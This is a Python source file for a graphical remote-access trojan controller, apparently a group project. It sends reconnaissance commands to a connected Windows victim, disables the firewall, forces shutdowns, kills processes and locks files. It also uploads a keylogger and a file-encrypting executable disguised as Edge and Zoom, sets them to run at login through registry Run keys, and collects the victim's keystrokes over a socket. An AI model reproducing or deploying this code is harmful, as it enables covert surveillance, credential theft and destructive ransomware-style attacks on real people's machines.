import os
import socket
import threading
import sys
import time
import kivy
import kivymd
from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.uix.screen import Screen
from kivymd.uix.dialog import MDDialog
from kivy.uix.boxlayout import BoxLayout
from kivymd.uix.button import MDFlatButton

KV = '''
ScreenManager:
    id: screenManager
    MDScreen:
        name: "startMenu"
        MDRectangleFlatButton:
            id: startBtn
            text: "Start Server"
            pos_hint: {"center_x": .5, "center_y": .5}
            opacity: 1
            disabled: False
            on_press: app.StartServer()
        MDLabel:
            id: statusLbl
            text: "Status"
            font_size: '22.5sp'
            halign: 'center'
            size_hint_y: None
            height: self.texture_size[1]
            pos_hint: {"center_x": .5, "center_y": .8}
    MDScreen:
        name: "mainMenu"            
        ScrollView:
            MDList:
                OneLineListItem:
                    id: networkInfoBtn
                    text: "Network Info"
                    on_press: app.NetworkInfo()
                OneLineListItem:
                    id: osInfoBtn
                    text: "OS Info"
                    on_press: app.OSInfo()
                OneLineListItem:
                    id: gpuInfoBtn
                    text: "GPU Info"
                    on_press: app.GpuInfo()
                OneLineListItem:
                    id: cpuBtn
                    text: "CPU Usage"
                    on_press: app.CpuUsage()
                OneLineListItem:
                    id: taskBtn
                    text: "Task List"
                    on_press: app.Tasks()
                OneLineListItem:
                    id: netserviceBtn
                    text: "Network Services"
                    on_press: app.Services()
                OneLineListItem:
                    id: userInfoBtn
                    text: "User Information"
                    on_press: app.UserInfo()
                OneLineListItem:
                    id: secPolicy
                    text: "Security Policy"
                    on_press: app.SecPolicy()
                OneLineListItem:
                    id: memInfo
                    text: "Memory Information"
                    on_press: app.MemInfo()
        MDTextField:
            id: consoleField
            max_height: '200dp'
            hint_text: 'Console'
            multiline: True
        MDIconButton:
            icon: "spider-thread"
            md_bg_color: 'red'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_press: app.DisruptionMenu()
    MDScreen:
        name: "disruptionMenu"
        ScrollView:
            MDList:
                OneLineListItem:
                    id: killTaskBtn
                    text: "Kill Task"
                    on_press: app.KillTask()
                OneLineListItem:
                    id: shutDownBtn
                    text: "Shutdown"
                    on_press: app.Shutdown()
                OneLineListItem:
                    id: fileCreateBtn
                    text: "File Creation Disruption"
                    on_press: app.FileCreate()
                OneLineListItem:
                    id: firewallBtn
                    text: "Firewall"
                    on_press: app.Firewall()
                OneLineListItem:
                    id: denyFileBtn
                    text: "Deny Files"
                    on_press: app.DenyFiles()
                OneLineListItem:
                    id: openBrowser
                    text: "Open Browsers"
                    on_press: app.OpenBrowsers()
                OneLineListItem:
                    id: instkeyloggerBtn
                    text: "Install Key Logger"
                    on_press: app.KeyloggerInstall()
                OneLineListItem:
                    id: keyloggerBtn
                    text: "Key Logger Start"
                    on_press: app.KeyloggerInit()
                OneLineListItem:
                    id: keyloggerstopBtn
                    text: "Key Logger Stop"
                    on_press: app.KeyloggerStop()
                OneLineListItem:
                    id: encryptfilesBtn
                    text: "Encrypt Files"
                    on_press: app.EncryptFiles()
        MDTextField:
            id: disruptConsoleField
            max_height: '200dp'
            hint_text: 'Console'
            multiline: True
        MDIconButton:
            icon: "menu"
            md_bg_color: 'lightblue'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_press: app.MainMenu()
<TaskKillContent>
    orientation: 'vertical'
    spacing: '12dp'
    size_hint_y: None
    height: '120dp'
    MDTextField:
        id: taskKillProcessID
        hint_text: 'Enter Process Name'
<DenyFilesContent>
    orientation: 'vertical'
    spacing: '12dp'
    size_hint_y: None
    height: '120dp'
    MDTextField:
        id: denyFilesID
        hint_text: 'Enter File Path'
'''
# Server IP and Port
HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
PORT = 21420

class Main(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "BlueGray"

        return Builder.load_string(KV)

    def StartServer(self):
        # Start server with the given host and port given and listen for a client
        self.server = socket.socket()
        self.server.bind((HOST, PORT))
        self.root.ids.statusLbl.text = 'Server started!'
        # print('Server started!')

        # A max of one client can be listend at a time
        self.server.listen(3)
        self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
        # print('Listening for a client connection to be established...')
        self.root.ids.startBtn.disabled = True
        self.root.ids.startBtn.opacity = 0
        threading.Thread(target=self.MainLoop).start()

    def MainLoop(self):
        while True:
            # Check whether connection is established
            self.currConn = self.server.accept()[0]
            self.root.ids.statusLbl.text = 'A client connected!'
            self.root.current = "mainMenu"
            print('A client has established connection!')

            self.exitKeyLogger = threading.Event()

    # Juls shizzle
    # This is to gather the client's information about their network
    def NetworkInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Send command to the client
            command = 'ipconfig /all'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive the output given from the client
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Gather Operating System Information
    def OSInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Host/Machine Name
            command = 'systeminfo | findstr /C:"Host Name"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get OS Information
            command = 'systeminfo | findstr /C:"OS"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Get Processor Information
            command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
            self.currConn.send(command.encode())
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print results
            print('Output:')
            print(output)
            print(output2)
            print(output3)

            self.root.ids.consoleField.text = output + output2 + output3
            break

    def GpuInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get GPU Name
            command = 'wmic path win32_VideoController get name'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get GPU Description
            command = 'wmic path win32_VideoController get Description'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Get GPU Version
            command = 'wmic path win32_VideoController get DriverVersion'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print results
            print('Output:')
            print(output)
            print(output2)
            print(output3)

            self.root.ids.consoleField.text = output + output2 + output3
            break

    # Zees stuff
    # Get the % of CPU Utilization
    def CpuUsage(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'wmic cpu get loadpercentage'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running tasks
    def Tasks(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Send command to client
            command = 'tasklist'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive output from client
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running services
    def Services(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'net start'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get security policy
    def SecPolicy(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'net accounts'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get memory information
    def MemInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Memory status
            command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Available memory
            command = 'systeminfo | findstr /C:"Available Physical Memory"'
            self.currConn.send(command.encode())
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Cache
            command = 'wmic cpu get L2CacheSize, L3CacheSize'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print result
            print('Output:')
            print(output)
            print(output2)
            print(output3)

            self.root.ids.consoleField.text = output + output2 + output3
            break

    # Fang's stuffz
    def UserInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Username, Fullname, Last Login
            command = 'net user "%USERNAME%"'
            self.currConn.send(command.encode())
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            output = output.splitlines()

            # Get SID
            command = 'wmic useraccount where name="%USERNAME%" get sid'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()
            output2 = output2.splitlines()

            # Print results
            print('Output: ')
            a1= f"{output[0]}\n{output[1]}\n{output[8]}"
            print(a1)
            a2 = f"SID\t\t\t\t\t\t\t{output2[2]}"

            self.root.ids.consoleField.text = a1 + a2
            break

    ###############################DISRUPTIONS############################################
    # Juls Simple Disruption
    # Disable Firewall Disruption
    def Firewall(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            command = "netsh advfirewall set allprofiles state off"
            self.currConn.send(command.encode())
            print('[+] Command sent')
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print(f"Output: {output}")
            self.root.ids.disruptConsoleField.text = output
            break

    # Prevent access to file
    def DenyFiles(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        self.denyFilesDialog = MDDialog(
            title="File Path:",
            type="custom",
            content_cls=DenyFilesContent(),
            buttons=[
                MDFlatButton(
                    text="CANCEL", on_press=lambda x: self.DismissDenyFilesDialog()
                ),
                MDFlatButton(
                    text="OK", on_press=lambda x: self.ExecuteDenyFiles()
                ),
            ],
        )

        self.denyFilesDialog.open()

    def DismissDenyFilesDialog(self, *args):
        self.denyFilesDialog.dismiss(force=True)

    def ExecuteDenyFiles(self):
        while True:
            command = 'cacls ' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            self.denyFilesDialog.dismiss(force=True)
            break

    # Juls Severe Disruption
    # Open many browsers
    def OpenBrowsers(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Zees Severe Disruption
    # File Creation Disruption
    def FileCreate(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''
            # Replace 20 with a larger number for actual attack
            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Zees Simple Disruptions
    # Shutdown Disruption
    def Shutdown(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            # /t is Timer
            command = 'shutdown /s /t 00'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Kill Task Disruption
    def KillTask(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        self.killTaskDialog = MDDialog(
            title="Task Kill:",
            type="custom",
            content_cls=TaskKillContent(),
            buttons=[
                MDFlatButton(
                    text="CANCEL", on_press=lambda x: self.DismissKillTaskDialog()
                ),
                MDFlatButton(
                    text="OK", on_press=lambda x: self.ExecuteKillTask()
                ),
            ],
        )

        self.killTaskDialog.open()

    def DismissKillTaskDialog(self, *args):
        self.killTaskDialog.dismiss(force=True)

    def ExecuteKillTask(self):
        while True:
            command = 'taskkill /im ' + self.killTaskDialog.content_cls.ids.taskKillProcessID.text + ' /F'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            self.killTaskDialog.dismiss(force=True)
            break

    # Fang's keylogging madness
    def KeyloggerInstall(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''
        
        tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
        kpath = os.path.join(os.getcwd(), "keylogger.exe")
        while True:
            # Check if payload is already on the target machine
            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            isExist = self.currConn.recv(int(recvsize)).decode()

            # Send payload to target if it isn't there yet
            if isExist.strip() == "False":
                print("Sending keylogger payload to victim.")

                # File transfer mode
                self.currConn.send("ft_True".encode())
                time.sleep(0.5)

                # Send target path and size of file
                self.currConn.send(str("echo " + tpath).encode())
                self.currConn.send(str(os.path.getsize(kpath)).encode())
                time.sleep(1)

                # Send exe in packets with size 8192
                f = open(kpath, 'rb')
                bytesToSend = f.read(8192)
                self.currConn.send(bytesToSend)
                totalSent = len(bytesToSend)
                while totalSent < os.path.getsize(kpath):
                    bytesToSend = f.read(8192)
                    totalSent = totalSent + len(bytesToSend)
                    self.currConn.send(bytesToSend)
                f.close()
                print("[VICTIM]: ", self.currConn.recv(1024).decode())
                time.sleep(0.05)
                # Add payload to registry to run on login

                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                self.currConn.send(command.encode())
                print('Command sent to client: ', command)
                recvsize = self.currConn.recv(1024).decode()
                output = self.currConn.recv(int(recvsize)).decode()
                print('Registry add: ', output)

                # Run payload once
                time.sleep(0.05)
                self.currConn.send("exe_True".encode())
                command = tpath
                self.currConn.send(command.encode())
                print('Command sent to client: ', command)
                output2 = self.currConn.recv(1024).decode()
                time.sleep(5)
                o1 =f"Keylogger{output2}"
                print(o1)
                self.root.ids.disruptConsoleField.text = o1
            else:
                o2 = "Keylogger already installed on target machine."
                print(o2)
                self.root.ids.disruptConsoleField.text = o2
            break

    def KeyloggerInit(self):
        threading.Thread(target=self.Keylogger).start()  # figure out how to kill thread

    def KeyloggerStop(self):
        self.exitKeyLogger.set()

    def Keylogger(self):
        try:
            self.exitKeyLogger.clear()

            # Connect to keylogger on port 47620
            klserver = socket.socket()
            klserver.bind((HOST, 47620))
            klserver.listen()
            print("Waiting for victim to transmit keylog info.")
            conn, addr = klserver.accept()
            print(f"Connection from {addr} established!")
            while True:
                if not self.exitKeyLogger.isSet():
                    keys = conn.recv(1024).decode()
                    print(keys)
                else:
                    break
            conn.close()
            print("Connection Closed.")

        except:
            pass

    def EncryptFiles(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''
        
        tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
        kpath = os.path.join(os.getcwd(), "encrypt.exe")
        while True:
            # Check if payload is already on the target machine
            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            isExist = self.currConn.recv(int(recvsize)).decode()

            # Send payload to target if it isn't there yet
            if isExist.strip() == "False":
                print("Sending encrypt file payload to victim.")

                # File transfer mode
                self.currConn.send("ft_True".encode())
                time.sleep(0.5)

                # Send target path and size of file
                self.currConn.send(str("echo " + tpath).encode())
                self.currConn.send(str(os.path.getsize(kpath)).encode())
                time.sleep(1)

                # Send exe in packets with size 8192
                f = open(kpath, 'rb')
                bytesToSend = f.read(8192)
                self.currConn.send(bytesToSend)
                totalSent = len(bytesToSend)
                while totalSent < os.path.getsize(kpath):
                    bytesToSend = f.read(8192)
                    totalSent = totalSent + len(bytesToSend)
                    self.currConn.send(bytesToSend)
                f.close()
                print("[VICTIM]: ", self.currConn.recv(1024).decode())
                time.sleep(0.05)

                # Add payload to registry to run on login
                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Zoom" /t REG_SZ /d "{tpath}" /f'
                self.currConn.send(command.encode())
                print('Command sent to client: ', command)
                recvsize = self.currConn.recv(1024).decode()
                output = self.currConn.recv(int(recvsize)).decode()
                print('Registry add: ', output)

                # Run payload once
                time.sleep(0.05)
                self.currConn.send("exe_True".encode())
                command = tpath
                self.currConn.send(command.encode())
                print('Command sent to client: ', command)
                output2 = self.currConn.recv(1024).decode()
                time.sleep(5)
                o1 = f"EncryptFile{output2}"
                print(o1)
                self.root.ids.disruptConsoleField.text = o1
            else:
                o2 = "EncryptFile already installed on target machine."
                print(o2)
                self.root.ids.disruptConsoleField.text = o2
            break

    def DisruptionMenu(self):
        self.root.current = "disruptionMenu"

    def MainMenu(self):
        self.root.current = "mainMenu"

class DenyFilesContent(BoxLayout):
    pass

class TaskKillContent(BoxLayout):
    pass

if __name__ == '__main__':
    Main().run()
